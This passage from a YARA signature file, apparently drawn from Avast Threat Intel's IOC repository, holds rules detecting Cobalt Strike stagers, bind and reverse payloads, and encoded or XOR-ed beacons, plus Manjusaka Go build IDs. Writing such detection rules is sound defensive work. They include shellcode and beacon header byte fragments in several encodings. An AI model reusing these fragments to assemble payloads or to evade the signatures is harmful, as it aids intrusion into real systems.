		uint32( @h01 + 0x013b ) == 0x07002600 and uint32( @h01 + 0x015b ) == 0x00006b00 and uint32( @h01 + 0x0179 ) == 0xe000df00 and uint32( @h01 + 0x01ad ) == 0x67003700 and uint32( @h01 + 0x01bf ) == 0xff003800 and uint32( @h01 + 0x01d3 ) == 0xe1003b00 and uint32( @h01 + 0x01e5 ) == 0x61004d00 and uint32( @h01 + 0x01f7 ) == 0x5600a200 and uint32( @h01 + 0x0211 ) == 0x5f00c800 and uint32( @h01 + 0x0237 ) == 0xe5005300 and uint32( @h01 + 0x0253 ) == 0x5f00c800 and uint32( @h01 + 0x027d ) == 0x61004d00
}

rule AVASTTI_Cobaltstrike_Raw_Payload_Tcp_Bind_X64_Utf16
{
	meta:
		description = "No description has been set in the source file - AvastTI"
		author = "Avast Threat Intel Team"
		id = "bd52fb44-379a-5c82-9c7c-b10c8080b53f"
		date = "2021-07-08"
		modified = "2021-07-08"
		reference = "https://github.com/avast/ioc"
		source_url = "https://github.com/avast/ioc/blob/5659f4f0f4e09970c5de29c536ceb500d5634951/CobaltStrike/yara_rules/cs_rules.yar#L398-L418"
		license_url = "N/A"
		logic_hash = "cdd8e0c9bdaf8d7662a118964abdea8eaea6c0e17fe1f20a80497c0c43d496d6"
		score = 75
		quality = 90
		tags = ""

	strings:
		$h01 = { FC 00 48 00 83 00 E4 00 F0 00 E8 00 C8 00 00 00 00 00 00 00 41 00 51 00 41 00 50 00 52 00 51 00 56 00 48 00 31 00 D2 00 65 00 48 00 8B 00 52 }

	condition:
		uint32( @h01 + 0x0203 ) == 0x07002600 and uint32( @h01 + 0x0225 ) == 0x00006b00 and uint32( @h01 + 0x025d ) == 0xe000df00 and uint32( @h01 + 0x0287 ) == 0x67003700 and uint32( @h01 + 0x02a3 ) == 0xff003800 and uint32( @h01 + 0x02c5 ) == 0xe1003b00 and uint32( @h01 + 0x02e1 ) == 0x61004d00 and uint32( @h01 + 0x0333 ) == 0x5f00c800 and uint32( @h01 + 0x0373 ) == 0xe5005300 and uint32( @h01 + 0x03a7 ) == 0x5f00c800 and uint32( @h01 + 0x03df ) == 0x61004d00
}

rule AVASTTI_Cobaltstrike_Raw_Payload_Tcp_Reverse_X86_Utf16
{
	meta:
		description = "No description has been set in the source file - AvastTI"
		author = "Avast Threat Intel Team"
		id = "321c1f3f-b7fc-5408-b460-6aa4423d381c"
		date = "2021-07-08"
		modified = "2021-07-08"
		reference = "https://github.com/avast/ioc"
		source_url = "https://github.com/avast/ioc/blob/5659f4f0f4e09970c5de29c536ceb500d5634951/CobaltStrike/yara_rules/cs_rules.yar#L420-L437"
		license_url = "N/A"
		logic_hash = "5495405ef3a54c960cf27147dce0d25cb298fee84a99415b59bc548c4f64a1e6"
		score = 75
		quality = 90
		tags = ""

	strings:
		$h01 = { FC 00 E8 00 89 00 00 00 00 00 00 00 60 00 89 00 E5 00 31 00 D2 00 64 00 8B 00 52 00 30 00 8B 00 52 00 0C 00 8B 00 52 00 14 00 8B 00 72 00 28 }

	condition:
		uint32( @h01 + 0x013b ) == 0x07002600 and uint32( @h01 + 0x015b ) == 0x00006b00 and uint32( @h01 + 0x0179 ) == 0xe000df00 and uint32( @h01 + 0x01ad ) == 0x61007400 and uint32( @h01 + 0x01cd ) == 0x5600a200 and uint32( @h01 + 0x01e7 ) == 0x5f00c800 and uint32( @h01 + 0x020d ) == 0xe5005300 and uint32( @h01 + 0x0229 ) == 0x5f00c800
}

rule AVASTTI_Cobaltstrike_Raw_Payload_Tcp_Reverse_X64_Utf16
{
	meta:
		description = "No description has been set in the source file - AvastTI"
		author = "Avast Threat Intel Team"
		id = "1cc2494c-1f39-5a72-93af-c267eaf768fe"
		date = "2021-07-08"
		modified = "2021-07-08"
		reference = "https://github.com/avast/ioc"
		source_url = "https://github.com/avast/ioc/blob/5659f4f0f4e09970c5de29c536ceb500d5634951/CobaltStrike/yara_rules/cs_rules.yar#L439-L456"
		license_url = "N/A"
		logic_hash = "d7e8fe5d2e07b7a85fadaa432bf345231ac4ddac5458167431403ddfe05467fc"
		score = 75
		quality = 90
		tags = ""

	strings:
		$h01 = { FC 00 48 00 83 00 E4 00 F0 00 E8 00 C8 00 00 00 00 00 00 00 41 00 51 00 41 00 50 00 52 00 51 00 56 00 48 00 31 00 D2 00 65 00 48 00 8B 00 52 }

	condition:
		uint32( @h01 + 0x0203 ) == 0x07002600 and uint32( @h01 + 0x0225 ) == 0x00006b00 and uint32( @h01 + 0x025d ) == 0xe000df00 and uint32( @h01 + 0x0287 ) == 0x61007400 and uint32( @h01 + 0x02d9 ) == 0x5f00c800 and uint32( @h01 + 0x0319 ) == 0xe5005300 and uint32( @h01 + 0x034d ) == 0x5f00c800 and uint32( @h01 + 0x0385 ) == 0x61004d00
}

rule AVASTTI_Cobaltstrike_Raw_Payload_Http_Stager_X86_Utf16
{
	meta:
		description = "No description has been set in the source file - AvastTI"
		author = "Avast Threat Intel Team"
		id = "c1602e85-5b42-5005-a6d1-7140cb57a3c7"
		date = "2021-07-08"
		modified = "2021-07-08"
		reference = "https://github.com/avast/ioc"
		source_url = "https://github.com/avast/ioc/blob/5659f4f0f4e09970c5de29c536ceb500d5634951/CobaltStrike/yara_rules/cs_rules.yar#L458-L478"
		license_url = "N/A"
		logic_hash = "b6e19ee9141aa22d73de6d8145257eba7b3b2bb2edc0996591085c84f242ec87"
		score = 75
		quality = 90
		tags = ""

	strings:
		$h01 = { FC 00 E8 00 89 00 00 00 00 00 00 00 60 00 89 00 E5 00 31 00 D2 00 64 00 8B 00 52 00 30 00 8B 00 52 00 0C 00 8B 00 52 00 14 00 8B 00 72 00 28 }

	condition:
		uint32( @h01 + 0x013b ) == 0x07002600 and uint32( @h01 + 0x0157 ) == 0xa7007900 and uint32( @h01 + 0x018f ) == 0xc6009f00 and uint32( @h01 + 0x01bf ) == 0x3b002e00 and uint32( @h01 + 0x01e7 ) == 0x7b001800 and uint32( @h01 + 0x0219 ) == 0x5d00e200 and uint32( @h01 + 0x022b ) == 0x31005e00 and uint32( @h01 + 0x0249 ) == 0x0b00e000 and uint32( @h01 + 0x058b ) == 0x5600a200 and uint32( @h01 + 0x05b3 ) == 0xe5005300 and uint32( @h01 + 0x05e9 ) == 0xe2008900
}

rule AVASTTI_Cobaltstrike_Raw_Payload_Http_Stager_X64_Utf16
{
	meta:
		description = "No description has been set in the source file - AvastTI"
		author = "Avast Threat Intel Team"
		id = "78672e3b-6f76-573a-8a9a-610334baa389"
		date = "2021-07-08"
		modified = "2021-07-08"
		reference = "https://github.com/avast/ioc"
		source_url = "https://github.com/avast/ioc/blob/5659f4f0f4e09970c5de29c536ceb500d5634951/CobaltStrike/yara_rules/cs_rules.yar#L480-L497"
		license_url = "N/A"
		logic_hash = "f88378749f0da0c66d66b917eeb11a56f083bb487c19c22a230dee4f50e1e309"
		score = 75
		quality = 90
		tags = ""

	strings:
		$h01 = { FC 00 48 00 83 00 E4 00 F0 00 E8 00 C8 00 00 00 00 00 00 00 41 00 51 00 41 00 50 00 52 00 51 00 56 00 48 00 31 00 D2 00 65 00 48 00 8B 00 52 }

	condition:
		uint32( @h01 + 0x01d5 ) == 0x07002600 and uint32( @h01 + 0x0205 ) == 0xa7007900 and uint32( @h01 + 0x0243 ) == 0xc6009f00 and uint32( @h01 + 0x0281 ) == 0x3b002e00 and uint32( @h01 + 0x02c9 ) == 0x7b001800 and uint32( @h01 + 0x0613 ) == 0x5600a200 and uint32( @h01 + 0x064b ) == 0xe5005300 and uint32( @h01 + 0x0687 ) == 0xe2008900
}

rule AVASTTI_Cobaltstrike_Raw_Payload_Https_Stager_X86_Utf16
{
	meta:
		description = "No description has been set in the source file - AvastTI"
		author = "Avast Threat Intel Team"
		id = "dcd3e5c8-7626-5a78-9f90-7a8e67311d90"
		date = "2021-07-08"
		modified = "2021-07-08"
		reference = "https://github.com/avast/ioc"
		source_url = "https://github.com/avast/ioc/blob/5659f4f0f4e09970c5de29c536ceb500d5634951/CobaltStrike/yara_rules/cs_rules.yar#L499-L520"
		license_url = "N/A"
		logic_hash = "5003ebd545182bb105cdcaaac2105a92cdd99a0178c24eb5ae2888232897aeb5"
		score = 75
		quality = 90
		tags = ""

	strings:
		$h01 = { FC 00 E8 00 89 00 00 00 00 00 00 00 60 00 89 00 E5 00 31 00 D2 00 64 00 8B 00 52 00 30 00 8B 00 52 00 0C 00 8B 00 52 00 14 00 8B 00 72 00 28 }

	condition:
		uint32( @h01 + 0x013b ) == 0x07002600 and uint32( @h01 + 0x0161 ) == 0xa7007900 and uint32( @h01 + 0x0199 ) == 0xc6009f00 and uint32( @h01 + 0x01d1 ) == 0x3b002e00 and uint32( @h01 + 0x0203 ) == 0x86009e00 and uint32( @h01 + 0x0223 ) == 0x7b001800 and uint32( @h01 + 0x0255 ) == 0x5d00e200 and uint32( @h01 + 0x0267 ) == 0x31005e00 and uint32( @h01 + 0x0285 ) == 0x0b00e000 and uint32( @h01 + 0x05d5 ) == 0x5600a200 and uint32( @h01 + 0x05fd ) == 0xe5005300 and uint32( @h01 + 0x0633 ) == 0xe2008900
}

rule AVASTTI_Cobaltstrike_Raw_Payload_Https_Stager_X64_Utf16
{
	meta:
		description = "No description has been set in the source file - AvastTI"
		author = "Avast Threat Intel Team"
		id = "aa93dd56-9589-5958-9711-ca2f9c763665"
		date = "2021-07-08"
		modified = "2021-07-08"
		reference = "https://github.com/avast/ioc"
		source_url = "https://github.com/avast/ioc/blob/5659f4f0f4e09970c5de29c536ceb500d5634951/CobaltStrike/yara_rules/cs_rules.yar#L522-L540"
		license_url = "N/A"
		logic_hash = "dee3eb3353da0179c58a33c3be0af6ad1e6aa9f13e9e6b9821c94f11d209266f"
		score = 75
		quality = 90
		tags = ""

	strings:
		$h01 = { FC 00 48 00 83 00 E4 00 F0 00 E8 00 C8 00 00 00 00 00 00 00 41 00 51 00 41 00 50 00 52 00 51 00 56 00 48 00 31 00 D2 00 65 00 48 00 8B 00 52 }

	condition:
		uint32( @h01 + 0x01d5 ) == 0x07002600 and uint32( @h01 + 0x0205 ) == 0xa7007900 and uint32( @h01 + 0x0249 ) == 0xc6009f00 and uint32( @h01 + 0x0287 ) == 0x3b002e00 and uint32( @h01 + 0x02db ) == 0x86009e00 and uint32( @h01 + 0x030f ) == 0x7b001800 and uint32( @h01 + 0x0659 ) == 0x5600a200 and uint32( @h01 + 0x0691 ) == 0xe5005300 and uint32( @h01 + 0x06cd ) == 0xe2008900
}

rule AVASTTI_Cobaltstrike_Payload_Encoded
{
	meta:
		description = "No description has been set in the source file - AvastTI"
		author = "Avast Threat Intel Team"
		id = "b5176740-2dda-5e5d-8c0f-47a27846753d"
		date = "2021-07-08"
		modified = "2021-07-08"
		reference = "https://github.com/avast/ioc"
		source_url = "https://github.com/avast/ioc/blob/5659f4f0f4e09970c5de29c536ceb500d5634951/CobaltStrike/yara_rules/cs_rules.yar#L542-L593"
		license_url = "N/A"
		logic_hash = "03c650b3c1797c03c635e25ea9d1d4589c6a4b31da0a3e48631fa16d0e3a342b"
		score = 75
		quality = 68
		tags = ""

	strings:
		$s01 = "0xfc, 0xe8, 0x89, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31, 0xd2, 0x64, 0x8b, 0x52, 0x30, 0x8b" ascii wide nocase
		$s02 = "0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b" ascii wide nocase
		$s03 = "0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc8, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51" ascii wide nocase
		$s04 = "0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc8,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51" ascii wide nocase
		$s05 = "fce8890000006089e531d2648b52308b" ascii wide nocase
		$s06 = "fc e8 89 00 00 00 60 89 e5 31 d2 64 8b 52 30 8b" ascii wide nocase
		$s07 = "fc4883e4f0e8c8000000415141505251" ascii wide nocase
		$s08 = "fc 48 83 e4 f0 e8 c8 00 00 00 41 51 41 50 52 51" ascii wide nocase
		$s09 = "/OiJAAAAYInlMdJki1Iwi1IMi1IUi3IoD7dKJjH/McCsPGF8Aiwgwc8NAcfi8FJX" ascii wide
		$s10 = "/EiD5PDoyAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHA" ascii wide
		$s11 = "38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0" ascii wide
		$s12 = "32ugx9PL6yMjI2JyYnNxcnVrEvFGa6hxQ2uocTtrqHEDa6hRc2sslGlpbhLqaxLj" ascii wide
		$s13 = "/ADoAIkAAAAAAAAAYACJAOUAMQDSAGQAiwBSADAAiwBSAAwAiwBSABQAiwByACg" ascii wide
		$s14 = "/ABIAIMA5ADwAOgAyAAAAAAAAABBAFEAQQBQAFIAUQBWAEgAMQDSAGUASACLAFI" ascii wide
		$s15 = "3yPLI6ojIyMjIyMjQyOqI8YjEiPxI0cjqCNxIxMjqCNxIy8jqCNxIzcjqCNRIwsj" ascii wide
		$s16 = "3yNrI6AjxyPTI8sj6yMjIyMjIyNiI3IjYiNzI3EjciN1I2sjEiPxI0YjayOoI3Ej" ascii wide
		$s17 = "Array(-4,-24,-119,0,0,0,96,-119,-27,49,-46,100,-117,82,48,-117" ascii wide
		$s18 = "Array(-4, -24, -119, 0, 0, 0, 96, -119, -27, 49, -46, 100, -117, 82, 48, -117" ascii wide
		$s19 = "Array(-4,72,-125,-28,-16,-24,-56,0,0,0,65,81,65,80,82,81" ascii wide
		$s20 = "Array(-4, 72, -125, -28, -16, -24, -56, 0, 0, 0, 65, 81, 65, 80, 82, 81" ascii wide
		$s21 = "Chr(-4)&Chr(-24)&Chr(-119)&Chr(0)&Chr(0)&Chr(0)&Chr(96)&Chr(-119)&Chr(-27)&\"1\"&Chr(-46)&\"d\"&Chr(-117)&\"R0\"&Chr(-117)" ascii wide
		$s22 = "Chr(-4)&\"H\"&Chr(-125)&Chr(-28)&Chr(-16)&Chr(-24)&Chr(-56)&Chr(0)&Chr(0)&Chr(0)&\"AQAPRQVH" ascii wide
		$s23 = "\\xfc\\xe8\\x89\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xd2\\x64\\x8b\\x52\\x30\\x8b" ascii wide nocase
		$s24 = "\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc8\\x00\\x00\\x00\\x41\\x51\\x41\\x50\\x52\\x51" ascii wide nocase

	condition:
		any of them
}

rule AVASTTI_Cobaltstrike_Strike_Payload_Xored
{
	meta:
		description = "No description has been set in the source file - AvastTI"
		author = "Avast Threat Intel Team"
		id = "0e075644-e278-5c5b-bdcc-dc2d6a32ce73"
		date = "2021-07-08"
		modified = "2021-07-08"
		reference = "https://github.com/avast/ioc"
		source_url = "https://github.com/avast/ioc/blob/5659f4f0f4e09970c5de29c536ceb500d5634951/CobaltStrike/yara_rules/cs_rules.yar#L595-L613"
		license_url = "N/A"
		logic_hash = "532cf38554ad7211fab74d050007f6fe8d63c20e05f21a6737fff12ac92a81d7"
		score = 75
		quality = 90
		tags = ""

	strings:
		$h01 = { 10 ?? 00 00 ?? ?? ?? 00 ?? ?? ?? ?? 61 61 61 61 }

	condition:
		uint32be( @h01 + 8 ) ^ uint32be( @h01 + 16 ) == 0xFCE88900 or uint32be( @h01 + 8 ) ^ uint32be( @h01 + 16 ) == 0xFC4883E4 or uint32be( @h01 + 8 ) ^ uint32be( @h01 + 16 ) == 0x4D5AE800 or uint32be( @h01 + 8 ) ^ uint32be( @h01 + 16 ) == 0x4D5A4152 or uint32be( @h01 + 8 ) ^ uint32be( @h01 + 16 ) == 0x90909090
}

rule AVASTTI_Cobaltstrike_Beacon_X86
{
	meta:
		description = "No description has been set in the source file - AvastTI"
		author = "Avast Threat Intel Team"
		id = "6ffaafe6-2758-53e4-b5b8-6d8350baf428"
		date = "2021-07-08"
		modified = "2021-07-08"
		reference = "https://github.com/avast/ioc"
		source_url = "https://github.com/avast/ioc/blob/5659f4f0f4e09970c5de29c536ceb500d5634951/CobaltStrike/yara_rules/cs_rules.yar#L615-L632"
		license_url = "N/A"
		logic_hash = "e6328aae5954ac8e3914e65603813ba4f11d97ff91d08a1398e1f71740879463"
		score = 75
		quality = 90
		tags = ""

	strings:
		$h01 = { 4D 5A E8 00 00 00 00 5B 89 DF 52 45 55 89 E5 81 C3 ?? ?? ?? ?? FF D3 68 }
		$h11 = { 00 01 00 01 00 02 ?? ?? 00 02 00 01 00 02 ?? ?? 00 }
		$h12 = { 69 68 69 68 69 6B ?? ?? 69 6B 69 68 69 6B ?? ?? 69 }
		$h13 = { 2E 2F 2E 2F 2E 2C ?? ?? 2E 2C 2E 2F 2E 2C ?? ?? 2E }

	condition:
		$h01 and any of ( $h1* )
}

rule AVASTTI_Cobaltstrike_Beacon_X64
{
	meta:
		description = "No description has been set in the source file - AvastTI"
		author = "Avast Threat Intel Team"
		id = "5d6d86ec-9e05-5596-b623-30f44c6f44db"
		date = "2021-07-08"
		modified = "2021-07-08"
		reference = "https://github.com/avast/ioc"
		source_url = "https://github.com/avast/ioc/blob/5659f4f0f4e09970c5de29c536ceb500d5634951/CobaltStrike/yara_rules/cs_rules.yar#L634-L651"
		license_url = "N/A"
		logic_hash = "7abf5f9a337c60944a52efcc7a16a768652c46843d2da3df2f946dd6e63f9375"
		score = 75
		quality = 90
		tags = ""

	strings:
		$h01 = { 4D 5A 41 52 55 48 89 E5 48 81 EC 20 00 00 00 48 8D 1D EA FF FF FF 48 89 }
		$h11 = { 00 01 00 01 00 02 ?? ?? 00 02 00 01 00 02 ?? ?? 00 }
		$h12 = { 69 68 69 68 69 6B ?? ?? 69 6B 69 68 69 6B ?? ?? 69 }
		$h13 = { 2E 2F 2E 2F 2E 2C ?? ?? 2E 2C 2E 2F 2E 2C ?? ?? 2E }

	condition:
		$h01 and any of ( $h1* )
}

rule AVASTTI_Cobaltstrike_Beacon_Encoded
{
	meta:
		description = "No description has been set in the source file - AvastTI"
		author = "Avast Threat Intel Team"
		id = "497e2a32-015a-5786-a6fa-de7084bfc389"
		date = "2021-07-08"
		modified = "2021-07-08"
		reference = "https://github.com/avast/ioc"
		source_url = "https://github.com/avast/ioc/blob/5659f4f0f4e09970c5de29c536ceb500d5634951/CobaltStrike/yara_rules/cs_rules.yar#L653-L703"
		license_url = "N/A"
		logic_hash = "f763c0c41a69c6bafb65517d20ef76242bf7b1626d6745d9a1c26772de3ffa26"
		score = 75
		quality = 68
		tags = ""

	strings:
		$s01 = "0x4d, 0x5a, 0xe8, 0x00, 0x00, 0x00, 0x00, 0x5b, 0x89, 0xdf, 0x52, 0x45, 0x55, 0x89, 0xe5, 0x81" ascii wide nocase
		$s02 = "0x4d,0x5a,0xe8,0x00,0x00,0x00,0x00,0x5b,0x89,0xdf,0x52,0x45,0x55,0x89,0xe5,0x81" ascii wide nocase
		$s03 = "0x4d, 0x5a, 0x41, 0x52, 0x55, 0x48, 0x89, 0xe5, 0x48, 0x81, 0xec, 0x20, 0x00, 0x00, 0x00, 0x48" ascii wide nocase
		$s04 = "0x4d,0x5a,0x41,0x52,0x55,0x48,0x89,0xe5,0x48,0x81,0xec,0x20,0x00,0x00,0x00,0x48" ascii wide nocase
		$s05 = "4d5ae8000000005b89df52455589e581" ascii wide nocase
		$s06 = "4d 5a e8 00 00 00 00 5b 89 df 52 45 55 89 e5 81" ascii wide nocase
		$s07 = "4d5a4152554889e54881ec2000000048" ascii wide nocase
		$s08 = "4d 5a 41 52 55 48 89 e5 48 81 ec 20 00 00 00 48" ascii wide nocase
		$s09 = "TVroAAAAAFuJ31JFVYnlg" ascii wide
		$s10 = "TVpBUlVIieVIgewgAAAAS" ascii wide
		$s11 = "bnnLIyMjI3iq/HFmdqrGo" ascii wide
		$s12 = "bnlicXZrqsZros8DIyMja" ascii wide
		$s13 = "TQBaAOgAAAAAAAAAAABbAIkA3wBSAEUAVQCJAOUAg" ascii wide
		$s14 = "TQBaAEEAUgBVAEgAiQDlAEgAgQDsACAAAAAAAAAAS" ascii wide
		$s15 = "biN5I2IjcSN2I2sjqiPGI2sjoiPPIwMjIyMjIyMja" ascii wide
		$s16 = "biN5I8sjIyMjIyMjIyN4I6oj/CNxI2YjdiOqI8Yjo" ascii wide
		$s17 = "Array(77,90,-24,0,0,0,0,91,-119,-33,82,69,85,-119,-27,-127" ascii wide
		$s18 = "Array(77, 90, -24, 0, 0, 0, 0, 91, -119, -33, 82, 69, 85, -119, -27, -127" ascii wide
		$s19 = "Array(77,90,65,82,85,72,-119,-27,72,-127,-20,32,0,0,0,72" ascii wide
		$s20 = "Array(77, 90, 65, 82, 85, 72, -119, -27, 72, -127, -20, 32, 0, 0, 0, 72" ascii wide
		$s21 = "MZ\"&Chr(-27)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(91)&Chr(-119)&Chr(-33)&\"REU\"&Chr(-119)&Chr(-27)&Chr(-127)" ascii wide
		$s22 = "MZARUH\"&Chr(-119)&Chr(-27)&\"H\"&Chr(-127)&Chr(-20)&Chr(32)&Chr(0)&Chr(0)&Chr(0)&\"H" ascii wide
		$s23 = "\\x4d\\x5a\\xe8\\x00\\x00\\x00\\x00\\x5b\\x89\\xdf\\x52\\x45\\x55\\x89\\xe5\\x81" ascii wide nocase
		$s24 = "\\x4d\\x5a\\x41\\x52\\x55\\x48\\x89\\xe5\\x48\\x81\\xec\\x20\\x00\\x00\\x00\\x48" ascii wide nocase

	condition:
		any of them
}

rule AVASTTI_Cobaltstrike_Beacon_Xored_X86
{
	meta:
		description = "No description has been set in the source file - AvastTI"
		author = "Avast Threat Intel Team"
		id = "d93c20e6-3e01-5132-88a0-63ace507cae9"
		date = "2021-07-08"
		modified = "2021-07-08"
		reference = "https://github.com/avast/ioc"
		source_url = "https://github.com/avast/ioc/blob/5659f4f0f4e09970c5de29c536ceb500d5634951/CobaltStrike/yara_rules/cs_rules.yar#L705-L726"
		license_url = "N/A"
		logic_hash = "1415c8ab5b4ddd6eb0f561b570358f04f967621dfc6274e0380879563b612c27"
		score = 75
		quality = 90
		tags = ""

	strings:
		$h01 = { FC E8??000000 [0-32] EB27 ?? 8B?? 83??04 8B?? 31?? 83??04 ?? 8B?? 31?? 89?? 31?? 83??04 83??04 31?? 39?? 7402 EBEA ?? FF?? E8D4FFFFFF }
		$h02 = { FC E8??000000 [0-32] EB2B ?? 8B??00 83C504 8B??00 31?? 83C504 55 8B??00 31?? 89??00 31?? 83C504 83??04 31?? 39?? 7402 EBE8 ?? FF?? E8D0FFFFFF }
		$h11 = { 7402 EB(E8|EA) ?? FF?? E8(D0|D4)FFFFFF }

	condition:
		any of ( $h0* ) and ( uint32be( @h11 + 12 ) ^ uint32be( @h11 + 20 ) == 0x4D5AE800 or uint32be( @h11 + 12 ) ^ uint32be( @h11 + 20 ) == 0x904D5AE8 or uint32be( @h11 + 12 ) ^ uint32be( @h11 + 20 ) == 0x90904D5A or uint32be( @h11 + 12 ) ^ uint32be( @h11 + 20 ) == 0x9090904D or uint32be( @h11 + 12 ) ^ uint32be( @h11 + 20 ) == 0x90909090 )
}

rule AVASTTI_Cobaltstrike_Beacon_Xored_X64
{
	meta:
		description = "No description has been set in the source file - AvastTI"
		author = "Avast Threat Intel Team"
		id = "15be610a-7552-5473-8da2-639220313783"
		date = "2021-07-08"
		modified = "2021-07-08"
		reference = "https://github.com/avast/ioc"
		source_url = "https://github.com/avast/ioc/blob/5659f4f0f4e09970c5de29c536ceb500d5634951/CobaltStrike/yara_rules/cs_rules.yar#L728-L746"
		license_url = "N/A"
		logic_hash = "11e6c8be28325d42f24fb5bb43c0b5fd35990a46857bae7c9940262a33c02a8c"
		score = 75
		quality = 90
		tags = ""

	strings:
		$h01 = { FC 4883E4F0 EB33 5D 8B4500 4883C504 8B4D00 31C1 4883C504 55 8B5500 31C2 895500 31D0 4883C504 83E904 31D2 39D1 7402 EBE7 58 FC 4883E4F0 FFD0 E8C8FFFFFF }
		$h11 = { FC 4883E4F0 FFD0 E8C8FFFFFF }

	condition:
		$h01 and ( uint32be( @h11 + 12 ) ^ uint32be( @h11 + 20 ) == 0x4D5A4152 or uint32be( @h11 + 12 ) ^ uint32be( @h11 + 20 ) == 0x904D5A41 or uint32be( @h11 + 12 ) ^ uint32be( @h11 + 20 ) == 0x90904D5A or uint32be( @h11 + 12 ) ^ uint32be( @h11 + 20 ) == 0x9090904D or uint32be( @h11 + 12 ) ^ uint32be( @h11 + 20 ) == 0x90909090 )
}

rule AVASTTI_Manjusaka_Framework_Go_Build_Id
{
	meta:
		description = "No description has been set in the source file - AvastTI"
		author = "Avast Threat Intel Team"
		id = "eca3324c-c029-53b5-b33d-9ec758dcd863"
		date = "2022-10-05"
		modified = "2022-10-05"
		reference = "https://github.com/avast/ioc"
		source_url = "https://github.com/avast/ioc/blob/5659f4f0f4e09970c5de29c536ceb500d5634951/Manjusaka/Manjusaka.yar#L15-L62"
		license_url = "N/A"
		hash = "955e9bbcdf1cb230c5f079a08995f510a3b96224545e04c1b1f9889d57dd33c1"
		hash = "f275ca5129399a521c8cd9754b1133ecd2debcfafc928c01df6bd438522c564a"
		hash = "637f3080526d7d0ad5eb41bf9331fb51aaafd30f2895c00a44ad905154f76d70"
		hash = "b5c366d782426bad4ba880dc908669ff785420dea02067b12e2261dd1988f34a"
		hash = "107b094031094cbb1f081d85ec2799c3450dce32e254bda2fd1bb32edb449aa4"
		hash = "fb5835f42d5611804aaa044150a20b13dcf595d91314ebef8cf6810407d85c64"
		hash = "ff20333d38f7affbfde5b85d704ee20cd60b519cb57c70e0cf5ac1f65acf91a6"
		hash = "3581d99feb874f65f53866751b7874c106b5ce65a523972ef6a736844209043c"
		hash = "6082bf26bcc07bf299a88eaa0272022418b12156cd987adfdff9fa1517afcf3d"
		hash = "14dfb43a1782b0b8d93c3d67d63b6c786b0a223bc50c3ec68106bd18d43652a4"
		hash = "4a0f47132867c12a6d009e43812729a1bb41f4eb83472ac352fc5b20fe937bef"
		hash = "bb1b7d506559c783ed747da461f58ea5256ba0a083768ae6aa1a2325017c4387"
		hash = "bd0e09e9ee4db74ada6433f00024a543f799046c15f635216ca4ae5e1f0c42e2"
		logic_hash = "de68bc483255c9c1095771925a7c2fc3062489a4468d42e7c6aa9f0146841c5c"
		score = 75
		quality = 88
		tags = ""

	strings:
		$h01 = { 47 6F 00 00 57 79 5F 76 69 62 44 5A 76 32 77 6D 35 62 4C 32 71 73 6A 4A 2F 34 50 4D 56 79 4D 39 39 76 61 76 58 68 7A 65 5A 34 6C 76 2D 2F 4E 59 6C 5F 4B 6D 75 53 45 62 53 4E 4A 6B 39 45 61 52 74 31 2F 2D 45 4D 50 57 64 6A 73 30 4E 6C 37 73 79 67 41 41 74 65 54 00 }
		$h02 = { 47 6F 00 00 79 30 4D 57 35 6A 74 30 45 6B 61 77 55 4B 35 6B 6B 6C 31 32 2F 5A 68 34 34 36 61 65 4D 7A 62 48 47 37 4F 73 56 4F 66 71 75 2F 6D 5F 58 74 43 52 32 32 39 75 4B 67 5A 62 51 65 44 35 43 74 2F 66 78 66 47 4A 47 61 59 4E 31 5F 36 6E 4E 76 32 58 5A 53 62 00 }
		$h03 = { 47 6F 06 FF FF FF 7F 79 30 4D 57 35 6A 74 30 45 6B 61 77 55 4B 35 6B 6B 6C 31 32 2F 5A 68 34 34 36 61 65 4D 7A 62 FF FF FF FF 48 47 37 4F 73 56 4F 66 71 75 2F 6D 5F 58 74 43 52 32 32 39 75 4B 67 5A 62 51 65 44 35 43 74 2F }
		$h04 = { 47 6F 00 00 30 33 30 36 42 53 4B 42 71 6E 71 4B 74 4D 51 71 67 53 58 4D 2F 68 4C 6A 34 77 76 56 56 4A 4C 79 42 43 61 4A 42 5F 38 4D 30 2F 73 74 66 62 47 73 46 5A 58 67 4E 6B 50 77 5A 4B 4C 71 52 65 2F 4D 49 46 68 69 67 7A 65 50 53 65 56 35 64 5F 52 6D 66 43 35 00 }
		$h05 = { 47 6F 06 FF FF FF 7F 30 33 30 36 42 53 4B 42 71 6E 71 4B 74 4D 51 71 67 53 58 4D 2F 68 4C 6A 34 77 76 56 56 4A 4C FF FF FF FF 79 42 43 61 4A 42 5F 38 4D 30 2F 73 74 66 62 47 73 46 5A 58 67 4E 6B 50 77 5A 4B 4C 71 52 65 }
		$h06 = { 47 6F 00 00 36 35 34 67 69 6A 50 41 55 6B 45 61 7A 4A 70 6A 44 39 4E 55 2F 67 44 75 48 46 31 78 66 64 70 39 31 53 66 36 53 59 51 48 58 2F 76 73 6E 6E 37 65 6B 67 30 54 4B 58 57 69 4F 53 63 46 30 44 2F 53 61 6D 30 73 51 6D 66 79 43 61 44 43 38 71 43 66 59 78 35 00 }
		$h07 = { 47 6F 06 FF ED FF 7F 36 35 34 67 69 6A 50 41 55 6B 45 61 7A 4A 70 6A 44 39 68 2F 67 44 75 48 46 31 78 66 FF FF FF FF 64 70 39 31 53 66 36 53 59 51 48 58 2F 76 73 6E 6E 37 65 6B 67 30 54 4B 58 57 69 4F 53 63 46 30 }
		$h08 = { 47 6F 20 62 FF FF FF FF 75 69 6C 64 20 49 44 3A 20 22 65 72 52 47 4F 4A 56 48 65 38 37 58 67 6D 79 4F 56 77 48 44 2F 42 FB FF FF FF 70 78 56 76 70 79 44 58 74 4C 64 64 79 57 46 64 38 4E 39 2F 6F 59 77 64 70 73 6D 46 45 }
